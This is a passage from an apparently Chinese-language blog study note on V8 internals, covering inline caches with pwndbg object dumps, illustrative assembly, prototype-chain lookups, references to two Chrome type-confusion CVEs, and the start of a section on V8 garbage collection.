class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x1ebf58a1f611</span> <span class="comment">//å…ˆçœ‹çœ‹Function</span></span><br><span class="line"><span class="number">0x1ebf58a1f611</span>: [<span class="title class_">Function</span>] <span class="keyword">in</span> <span class="title class_">OldSpace</span></span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x0058089003b9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x1ebf58a02109</span> &lt;<span class="title class_">JSFunction</span> (sfi = <span class="number">0x76000683b29</span>)&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x336a62180c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - <span class="keyword">function</span> <span class="attr">prototype</span>:</span><br><span class="line"> - <span class="attr">initial_map</span>:</span><br><span class="line"> - <span class="attr">shared_info</span>: <span class="number">0x1ebf58a1f371</span> &lt;<span class="title class_">SharedFunctionInfo</span> getSloth&gt;</span><br><span class="line"> - <span class="attr">name</span>: <span class="number">0x1ebf58a1f241</span> &lt;<span class="title class_">String</span>[#<span class="number">8</span>]: getSloth&gt;</span><br><span class="line"> - <span class="attr">formal_parameter_count</span>: <span class="number">1</span></span><br><span class="line"> - <span class="attr">kind</span>: <span class="title class_">NormalFunction</span></span><br><span class="line"> - <span class="attr">context</span>: <span class="number">0x1ebf58a1f5d9</span> &lt;<span class="title class_">ScriptContext</span>[<span class="number">5</span>]&gt;</span><br><span class="line"> - <span class="attr">code</span>: <span class="number">0x176fcf304101</span> &lt;<span class="title class_">Code</span> <span class="variable constant_">BUILTIN</span> <span class="title class_">InterpreterEntryTrampoline</span>&gt;</span><br><span class="line"> - interpreted</span><br><span class="line"> - <span class="attr">bytecode</span>: <span class="number">0x1ebf58a1fb09</span> &lt;<span class="title class_">BytecodeArray</span>[<span class="number">6</span>]&gt;</span><br><span class="line"> - source <span class="attr">code</span>: (obj) &#123;</span><br><span class="line"><span class="keyword">return</span> obj.<span class="property">sloth</span>;</span><br><span class="line">&#125;</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x336a62180c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #<span class="attr">length</span>: <span class="number">0x0760006804b9</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line">    #<span class="attr">name</span>: <span class="number">0x076000680449</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line">    #<span class="attr">arguments</span>: <span class="number">0x076000680369</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line">    #<span class="attr">caller</span>: <span class="number">0x0760006803d9</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line">    #<span class="attr">prototype</span>: <span class="number">0x076000680529</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> - feedback <span class="attr">vector</span>: <span class="number">0x1ebf58a1fb79</span>: [<span class="title class_">FeedbackVector</span>] <span class="keyword">in</span> <span class="title class_">OldSpace</span> <span class="comment">//ğŸŒŸè·Ÿè¿›</span></span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x336a62180c11</span> &lt;<span class="title class_">Map</span>&gt;</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">2</span></span><br><span class="line"> - shared <span class="keyword">function</span> <span class="attr">info</span>: <span class="number">0x1ebf58a1f371</span> &lt;<span class="title class_">SharedFunctionInfo</span> getSloth&gt;</span><br><span class="line"> - optimized code/<span class="attr">marker</span>: <span class="title class_">OptimizationMarker</span>::kNone</span><br><span class="line"> - invocation <span class="attr">count</span>: <span class="number">20</span></span><br><span class="line"> - profiler <span class="attr">ticks</span>: <span class="number">0</span></span><br><span class="line"> - slot #<span class="number">0</span> <span class="title class_">LoadProperty</span> <span class="variable constant_">MONOMORPHIC</span> &#123;</span><br><span class="line">     [<span class="number">0</span>]: [weak] <span class="number">0x00580890ab39</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt;</span><br><span class="line">     [<span class="number">1</span>]: <span class="number">836</span></span><br><span class="line">  &#125;</span><br><span class="line">pwndbg&gt; job  <span class="number">0x1ebf58a1fb79</span> <span class="comment">//çœ‹çœ‹FeedbackVector</span></span><br><span class="line"><span class="number">0x1ebf58a1fb79</span>: [<span class="title class_">FeedbackVector</span>] <span class="keyword">in</span> <span class="title class_">OldSpace</span></span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x336a62180c11</span> &lt;<span class="title class_">Map</span>&gt;</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">2</span></span><br><span class="line"> - shared <span class="keyword">function</span> <span class="attr">info</span>: <span class="number">0x1ebf58a1f371</span> &lt;<span class="title class_">SharedFunctionInfo</span> getSloth&gt;</span><br><span class="line"> - optimized code/<span class="attr">marker</span>: <span class="title class_">OptimizationMarker</span>::kNone</span><br><span class="line"> - invocation <span class="attr">count</span>: <span class="number">20</span></span><br><span class="line"> - profiler <span class="attr">ticks</span>: <span class="number">0</span></span><br><span class="line"> - slot #<span class="number">0</span> <span class="title class_">LoadProperty</span> <span class="variable constant_">MONOMORPHIC</span> &#123; </span><br><span class="line">     [<span class="number">0</span>]: [weak] <span class="number">0x00580890ab39</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; <span class="comment">//æœ€åè¢«è°ƒç”¨çš„LoadICï¼Œå…¶å®æ˜¯ä¸ªMap</span></span><br><span class="line">     [<span class="number">1</span>]: <span class="number">836</span></span><br><span class="line">  &#125;</span><br><span class="line">pwndbg&gt; job <span class="number">0x00580890ab39</span> <span class="comment">//çœ‹çœ‹Mapï¼Œå¯ä»¥å‘ç°æ˜¯æŸä¸ªObjectçš„map</span></span><br><span class="line"><span class="number">0x580890ab39</span>: [<span class="title class_">Map</span>]</span><br><span class="line"> - <span class="attr">type</span>: <span class="variable constant_">JS_OBJECT_TYPE</span></span><br><span class="line"> - instance <span class="attr">size</span>: <span class="number">32</span></span><br><span class="line"> - inobject <span class="attr">properties</span>: <span class="number">1</span></span><br><span class="line"> - elements <span class="attr">kind</span>: <span class="variable constant_">HOLEY_ELEMENTS</span></span><br><span class="line"> - unused property <span class="attr">fields</span>: <span class="number">0</span></span><br><span class="line"> - enum <span class="attr">length</span>: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back <span class="attr">pointer</span>: <span class="number">0x00580890aae9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt;</span><br><span class="line"> - prototype_validity <span class="attr">cell</span>: <span class="number">0x076000680609</span> &lt;<span class="title class_">Cell</span> value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance <span class="title function_">descriptors</span> (own) #<span class="number">1</span>: <span class="number">0x14305458ddf9</span> &lt;<span class="title class_">DescriptorArray</span>[<span class="number">1</span>]&gt; ğŸŒŸ</span><br><span class="line"> - layout <span class="attr">descriptor</span>: (nil)</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x1ebf58a02091</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x5808900229</span>&gt;</span><br><span class="line"> - <span class="attr">constructor</span>: <span class="number">0x1ebf58a020c9</span> &lt;<span class="title class_">JSFunction</span> <span class="title class_">Object</span> (sfi = <span class="number">0x760006857e9</span>)&gt;</span><br><span class="line"> - dependent <span class="attr">code</span>: <span class="number">0x336a621802c1</span> &lt;<span class="title class_">Other</span> heap <span class="title function_">object</span> (<span class="variable constant_">WEAK_FIXED_ARRAY_TYPE</span>)&gt;</span><br><span class="line"> - construction <span class="attr">counter</span>: <span class="number">0</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x14305458ddf9</span> <span class="comment">//çœ‹çœ‹descriptors ï¼Œä¹Ÿå°±æ˜¯å­˜propertyçš„åœ°æ–¹</span></span><br><span class="line"><span class="number">0x14305458ddf9</span>: [<span class="title class_">DescriptorArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x336a62180271</span> &lt;<span class="title class_">Map</span>&gt;</span><br><span class="line"> - <span class="attr">enum_cache</span>: empty</span><br><span class="line"> - nof slack <span class="attr">descriptors</span>: <span class="number">0</span></span><br><span class="line"> - nof <span class="attr">descriptors</span>: <span class="number">1</span></span><br><span class="line"> - raw marked <span class="attr">descriptors</span>: mc epoch <span class="number">0</span>, marked <span class="number">0</span></span><br><span class="line">  [<span class="number">0</span>]: #<span class="title function_">sloth</span> (<span class="keyword">const</span> data field <span class="number">0</span>:s, <span class="attr">p</span>: <span class="number">0</span>, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>]) @ <span class="title class_">Any</span> <span class="comment">//å°±æ˜¯æˆ‘ä»¬è®¿é—®çš„é‚£ä¸ªobjï¼Œå±æ€§æ˜¯sloth</span></span><br></pre></td></tr></table></figure></div><ul><li>å¯ä»¥å‘ç°<code>FeedBackVector</code>çš„slotä¸­å…¶å®å°±æ˜¯å­˜å‚¨äº†ä¸€ä¸ªä¸ªç¼“å­˜çš„Mapï¼Œ<code>LdaNamedProperty </code>è°ƒç”¨slotä¸­çš„[0]ï¼Œä¹Ÿå°±å¯¹åº”äº†è§¦å‘Inline Cacheçš„<code>obj.sloth</code>çš„è¿™ä¸ª<code>obj</code>çš„Map</li><li>åŒæ—¶<code>FeedBackVector</code>çš„slotä¸­è¿˜æœ‰ä¸€ä¸ªå…ƒç´ <code>slto[1]:836</code>ï¼Œå‰é¢è¯´åˆ°è§¦å‘Inline Cacheåï¼Œä¼šæŠŠ<code>IC-Hit Handler</code>å’Œ<code>Map</code>åŠ å…¥ç¼“å­˜ï¼Œè¿™ä¸ª836å°±æ˜¯<code>IC-Hit Handler</code>ï¼ˆHandleræ˜¯V8å°è£…çš„æŒ‡é’ˆï¼‰<ul><li><strong>IC-Hit Handler</strong> æ˜¯æŒ‡å½“ Inline Cacheæœºåˆ¶åŒ¹é…ä¸Šä¹‹å‰ç¼“å­˜çš„ä¿¡æ¯æ—¶ï¼Œç›´æ¥è§¦å‘æ‰§è¡Œçš„å¤„ç†é€»è¾‘</li><li>å¦‚æœå½“å‰æ“ä½œæ¨¡å¼å’Œç¼“å­˜çš„ä¿¡æ¯åŒ¹é…ï¼ˆ<strong>IC hit</strong>ï¼‰ï¼ŒV8 ä¼šç›´æ¥ä½¿ç”¨ç¼“å­˜çš„ Handler æ¥æ‰§è¡Œè¯¥æ“ä½œï¼Œè€Œä¸æ˜¯é‡æ–°è¿›è¡Œå±æ€§æŸ¥æ‰¾æˆ–ç±»å‹åˆ¤æ–­ã€‚</li></ul></li></ul></blockquote><h4 id="è§¦å‘JITçš„æƒ…å†µ"><a href="#è§¦å‘JITçš„æƒ…å†µ" class="headerlink" title="è§¦å‘JITçš„æƒ…å†µ"></a>è§¦å‘JITçš„æƒ…å†µ</h4><p>æŠŠå¾ªç¯æ¬¡æ•°åŠ å¤§åˆ°ä¸€å®šæ•°é‡ï¼Œå°±ä¼šè§¦å‘JITä¼˜åŒ–ï¼Œä¼šå°†hot codeç›´æ¥è½¬æ¢æˆæ±‡ç¼–</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o = &#123;sloth : <span class="number">1440</span>&#125;;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getSloth</span>(<span class="params">obj</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> obj.<span class="property">sloth</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">100000</span>;i++)<span class="comment">//è§¦å‘inline Cache &amp; JIT</span></span><br><span class="line"><span class="title function_">getSloth</span>(o);</span><br></pre></td></tr></table></figure></div><p>å…·ä½“æ±‡ç¼–é€»è¾‘ç±»ä¼¼</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">      mov ecx, &quot;sloth&quot;</span><br><span class="line">      mov eax, obj</span><br><span class="line">      cmp [eax + kMapOffset], &lt;cached map of obj&gt; # é¦–å…ˆæ¯”è¾ƒä¼ å…¥å‡½æ•°çš„objectçš„Mapæ˜¯å¦ä¸Cacheä¸­çš„Mapä¸€è‡´</span><br><span class="line">      jne miss</span><br><span class="line">      mov eax, [eax + kPropertiesOffset] </span><br><span class="line">      mov eax, [eax + &lt;cached offset of property sloth&gt;] #ç›´æ¥æ ¹æ®offsetè®¿é—®property</span><br><span class="line">      jmp done</span><br><span class="line">miss:</span><br><span class="line">call IC_Miss</span><br><span class="line">done:</span><br></pre></td></tr></table></figure></div><h3 id="polymorphicï¼ˆå¤šæ€ï¼‰"><a href="#polymorphicï¼ˆå¤šæ€ï¼‰" class="headerlink" title="polymorphicï¼ˆå¤šæ€ï¼‰"></a>polymorphicï¼ˆå¤šæ€ï¼‰</h3><p>ç®€å•æ¥è¯´å°±æ˜¯ä¸Šé¢çš„getSlothå‡½æ•°è¢«å¤šæ¬¡è°ƒç”¨ï¼Œä½†æ¯æ¬¡ä¼ å…¥çš„objçš„propertieséƒ½å’Œä¸Šæ¬¡ä¸ä¸€è‡´ï¼ˆå¯¹æ ‡2-4ä¸ªMapçš„æƒ…å†µï¼‰ï¼Œä¸‹é¢çš„ä¾‹å­æ˜¯map1-&gt;map2-&gt;map1-&gt;map2ï¼Œé‚£ä¹ˆå°±è¦ç”Ÿæˆä¸€ç³»åˆ—çš„map checkæ¯”è¾ƒï¼Œä»¥åˆ¤æ–­é€‰æ‹©å“ªä¸ªmapçš„Inline Cache</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o = &#123;sloth : <span class="number">1440</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> o1 = &#123;<span class="attr">passion</span>:<span class="number">1</span>, sloth : <span class="number">1440</span>&#125;;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getSloth</span>(<span class="params">obj</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> obj.<span class="property">sloth</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">100000</span>;i++)&#123;<span class="comment">//è§¦å‘inline Cache &amp; JIT</span></span><br><span class="line"><span class="title function_">getSloth</span>(o);</span><br><span class="line"><span class="title function_">getSloth</span>(o1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ç”Ÿæˆçš„æ±‡ç¼–é€»è¾‘ç±»ä¼¼</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">    mov ecx, &quot;sloth&quot;</span><br><span class="line">    mov eax, obj</span><br><span class="line">    call IC_Polymorphic_sloth</span><br><span class="line"></span><br><span class="line">IC_Monomorphic_sloth: #å•æ€æƒ…å†µ</span><br><span class="line">    cmp [eax], &lt;map&gt;</span><br><span class="line">    jne miss</span><br><span class="line">    mov eax, [eax + 4]</span><br><span class="line">    mov eax, [eax + &lt;sloth_offset&gt;]</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">miss:</span><br><span class="line">    jmp IC_Miss</span><br><span class="line"></span><br><span class="line">IC_Polymorphic_sloth: #å¤šæ€æƒ…å†µ</span><br><span class="line">    cmp [eax], &lt;map1&gt; #å…ˆæ¯”è¾ƒmap1</span><br><span class="line">    jne check2</span><br><span class="line">    mov eax, [eax + 4] #32ä½ä¸‹propertyå¯¹åº”çš„åç§»</span><br><span class="line">    mov eax, [eax + &lt;sloth_offset1&gt;] </span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">check2:</span><br><span class="line">    cmp [eax], &lt;map2&gt; #å†æ¯”è¾ƒmap2</span><br><span class="line">    jne miss</span><br><span class="line">    mov eax, [eax + 4]</span><br><span class="line">    mov eax, [eax + &lt;sloth_offset2&gt;]</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">miss:</span><br><span class="line">    jmp IC_Miss</span><br></pre></td></tr></table></figure></div><h3 id="Megamorphicï¼ˆè¶…æ€ï¼‰"><a href="#Megamorphicï¼ˆè¶…æ€ï¼‰" class="headerlink" title="Megamorphicï¼ˆè¶…æ€ï¼‰"></a>Megamorphicï¼ˆè¶…æ€ï¼‰</h3><p>è¶…è¿‡äº†4ä¸ªMapï¼ˆæˆ–å¼•æ“è®¾è®¡çš„å¤šæ€ç¼“å­˜çš„å®¹é‡ï¼‰ï¼ŒV8æ‡’å¾—ç®¡ç†äº†ï¼Œæ­¤æ—¶ç¼“å­˜æœºåˆ¶åˆ‡æ¢ä¸ºé€šç”¨æŸ¥æ‰¾ï¼Œè€Œéç‰¹å®šç±»å‹ä¼˜åŒ–</p><h3 id="ä¸€äº›ç‰¹æ®Šæƒ…å†µâ€”â€”è®¿é—®ä¸€ä¸ªç»§æ‰¿çš„property"><a href="#ä¸€äº›ç‰¹æ®Šæƒ…å†µâ€”â€”è®¿é—®ä¸€ä¸ªç»§æ‰¿çš„property" class="headerlink" title="ä¸€äº›ç‰¹æ®Šæƒ…å†µâ€”â€”è®¿é—®ä¸€ä¸ªç»§æ‰¿çš„property"></a>ä¸€äº›ç‰¹æ®Šæƒ…å†µâ€”â€”è®¿é—®ä¸€ä¸ªç»§æ‰¿çš„property</h3><p>æœ¯è¯­è¡¥å……ï¼š</p><ul><li><strong>Receiver</strong> æ˜¯æ‰§è¡Œå±æ€§è®¿é—®æˆ–æ–¹æ³•è°ƒç”¨æ—¶ï¼Œå®é™…çš„ç›®æ ‡å¯¹è±¡</li><li><strong>Holder</strong> æ˜¯å®é™…å­˜å‚¨ç›®æ ‡å±æ€§çš„å¯¹è±¡ã€‚å®ƒè¡¨ç¤ºå±æ€§è®¿é—®æ—¶çš„æŸ¥æ‰¾ç»ˆç‚¹</li></ul><p>ä¸¾ä¸ªä¾‹å­ï¼Œä¸‹é¢çš„js codeä¸­ï¼Œä»¥è®¿é—®<code>obj2.X</code>ä¸ºä¾‹ï¼Œ<strong>å®é™…è¿›â¾å±æ€§è®¿é—®çš„å¯¹è±¡</strong>obj2æ˜¯receiver<strong>ï¼Œâ½½çœŸæ­£æŒæœ‰å±æ€§</strong>Xçš„å¯¹è±¡obj<strong>æ˜¯</strong>holder<strong>ã€‚</strong></p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;X : <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> obj1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> obj2 = &#123;&#125;;</span><br><span class="line">obj2.<span class="property">__proto__</span> = obj1;</span><br><span class="line">obj1.<span class="property">__proto__</span> = obj;</span><br><span class="line"><span class="title function_">print</span>(obj2.<span class="property">X</span>);</span><br><span class="line"><span class="comment">//outputï¼š 1</span></span><br><span class="line"><span class="comment">//protochainï¼šobj-&gt;obj1-&gt;obj2</span></span><br></pre></td></tr></table></figure></div><blockquote><p>ğŸ’¡å­¦è¿‡Webçš„jsåŸå‹è¿æ±¡æŸ“çš„åº”è¯¥å¯¹è¿™ä¸ªå¾ˆç†Ÿæ‚‰äº†ï¼Œjsä¸­å¯ä»¥é€šè¿‡è®¾ç½®å¯¹è±¡çš„ <code>__proto__</code> å±æ€§æ¥åŠ¨æ€è°ƒæ•´å¯¹è±¡çš„åŸå‹é“¾ï¼Œä»è€Œè®¾ç½®æˆ–æ›´æ”¹ä¸€ä¸ªå¯¹è±¡çš„â€œçˆ¶å¯¹è±¡â€ï¼ˆå³å®ƒçš„åŸå‹å¯¹è±¡ï¼‰ã€‚</p><p>å› æ­¤å¦‚æœè®¿é—®obj2çš„Xå±æ€§ï¼Œå®é™…ä¸Šéœ€è¦é¡ºç€obj2çš„åŸå‹é“¾å‘ä¸Šä¸€ç›´æ‰¾åˆ°objè¿™ä¸ªholderï¼Œè€Œinline Cacheä¹Ÿå¾—éµå¾ªè¿™ä¸ªé€»è¾‘ï¼Œæ‰€ä»¥<u>obj2çš„inline Cacheå¿…é¡»æ²¿ç€protochainï¼Œå¯¹é“¾ä¸Šçš„æ¯ä¸ªmapéƒ½è¿›â¾checkã€‚</u></p></blockquote><h3 id="Inline-Cacheç›¸å…³CVE"><a href="#Inline-Cacheç›¸å…³CVE" class="headerlink" title="Inline Cacheç›¸å…³CVE"></a>Inline Cacheç›¸å…³CVE</h3><p>CVE-2022-1134</p><p><a class="link"   href="https://github.blog/2022-06-29-the-chromium-super-inline-cache-type-confusion/" >https://github.blog/2022-06-29-the-chromium-super-inline-cache-type-confusion/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>CVE-2021-38001</p><p><a class="link"   href="https://bugs.chromium.org/p/chromium/issues/detail?id=1260577" >https://bugs.chromium.org/p/chromium/issues/detail?id=1260577 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://github.com/vngkv123/articles/blob/main/CVE-2021-38001.md" >https://github.com/vngkv123/articles/blob/main/CVE-2021-38001.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>æ¼æ´æ ¹å› ï¼šInline Cacheçš„å¤„ç†ç¨‹åºï¼ˆä¹Ÿå°±æ˜¯IC Handlerï¼‰åœ¨åˆ›å»ºæ—¶ä¼šåŸºäºæŸäº›å‡è®¾ï¼ˆä¾‹å¦‚å¯¹è±¡ç»“æ„Mapã€åŸå‹é“¾çŠ¶æ€ç­‰ï¼‰ç”Ÿæˆä¼˜åŒ–çš„ä»£ç ï¼Œå› æ­¤æœ‰æœºä¼šé€ æˆä¸€äº›ç±»å‹æ··æ·†æ¼æ´ã€‚ï¼ˆJITä¸­ä¹Ÿæœ‰ç±»ä¼¼ï¼‰</p><p>ğŸ§ TODOï¼šå…ˆæŒ–ä¸ªå‘ï¼Œåé¢æœ‰æ—¶é—´å†è¿›è¡Œè°ƒè¯•åˆ†æ</p><h2 id="0x01-åƒåœ¾å›æ”¶-GC-ğŸ—‘ï¸"><a href="#0x01-åƒåœ¾å›æ”¶-GC-ğŸ—‘ï¸" class="headerlink" title="0x01 åƒåœ¾å›æ”¶(GC)ğŸ—‘ï¸"></a>0x01 åƒåœ¾å›æ”¶(GC)ğŸ—‘ï¸</h2><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>V8ä¸­çš„åƒåœ¾å›æ”¶ï¼ˆGCï¼‰ä¸Javaçš„GCç±»ä¼¼ï¼Œéƒ½æ˜¯é€šè¿‡è‡ªåŠ¨å†…å­˜ç®¡ç†æ¥å›æ”¶ä¸å†ä½¿ç”¨çš„å¯¹è±¡ï¼ˆä¹Ÿå°±æ˜¯HeapObjectï¼‰ã€‚</p><blockquote><p>ç›¸è¾ƒäºä¼ ç»Ÿçš„<code>glibc</code>ä¸­çš„heapç®¡ç†æ–¹å¼ï¼ˆmallocã€freeï¼‰ä¸ä¸€æ ·ï¼ŒV8ä½¿â½¤mmapæ¥æ‹“å±•å †ç©ºé—´</p></blockquote><h3 id="GCç©ºé—´åˆ’åˆ†"><a href="#GCç©ºé—´åˆ’åˆ†" class="headerlink" title="GCç©ºé—´åˆ’åˆ†"></a>GCç©ºé—´åˆ’åˆ†</h3><p>ä¸»è¦æ˜¯3å—</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">  A[&quot;Young Generation&quot;] </span><br><span class="line">  B[&quot;Old Generation&quot;]</span><br><span class="line">  C[&quot;Other&quot;] </span><br></pre></td></tr></table></figure></div><blockquote><p>æ ¹æ®Objectçš„å­˜æ´»æ—¶é—´ï¼Œåˆ†ä¸ºYoung&#x2F;Old Generationï¼Œé™¤æ­¤ä¹‹å¤–çš„OtheråŒºåŸŸä¸å±äºä»»ä½•ä¸€ä¸ªGenerationï¼Œè€ç‰ˆæœ¬ä¸­OtheråŒºåŸŸå…¶å®æ˜¯Large Object Spaceï¼Œæ”¾ä¸€äº›å¤§å°è¶…è¿‡ä¸€å®šé˜ˆå€¼çš„Object</p></blockquote><h3 id="Young-Generation"><a href="#Young-Generation" class="headerlink" title="Young Generation"></a>Young Generation</h3><p>ç»“æ„å¦‚ä¸‹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[Young Generation] --&gt; B[New Space]</span><br><span class="line">    B --&gt; C[To Space]</span><br><span class="line">    B --&gt; D[From Space]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><ul><li><p>New Space</p><ul><li>æ–°åˆ›å»ºçš„objectéƒ½ä¼šè¢«æ”¾å…¥è¿™é‡Œé¢ï¼ˆé™¤äº†code objectï¼Œmap objectå’Œlarge objectï¼‰å¹¶å—GCç®¡ç†</li></ul></li><li><p>è¿™å—åŒºåŸŸä½¿ç”¨çš„GCç®—æ³•æ˜¯Cheneyâ€™s algorithmï¼ˆ<strong>å®é™…ä¸Šæ˜¯Cheneyâ€™s GCå¤åˆ¶ç®—æ³•çš„æ”¹ç‰ˆï¼ŒFrom&#x2F;To Spaceçš„åŠŸèƒ½å’ŒåŸç‰ˆä¸ä¸€æ ·ï¼Œæºç é‡Œç›¸å…³å‡½æ•°å«Scavenge</strong>ï¼‰ï¼Œéœ€è¦ä½¿ç”¨åˆ°To Spaceå’ŒFrom Spaceï¼Œå…¶å®è¿™ä¸ªç®—æ³•å¾ˆå¥½ç†è§£ï¼š</p><ul><li><p>æ¯ä¸€ä¸ªæ–°åˆ›å»ºçš„Objectæœ€å¼€å§‹éƒ½ä¼šè¢«æ”¾å…¥To Space </p></li><li><p>å‡è®¾å‡ºç°memory exhaustionï¼ˆç©ºé—´è€—å°½ï¼‰ï¼šTo 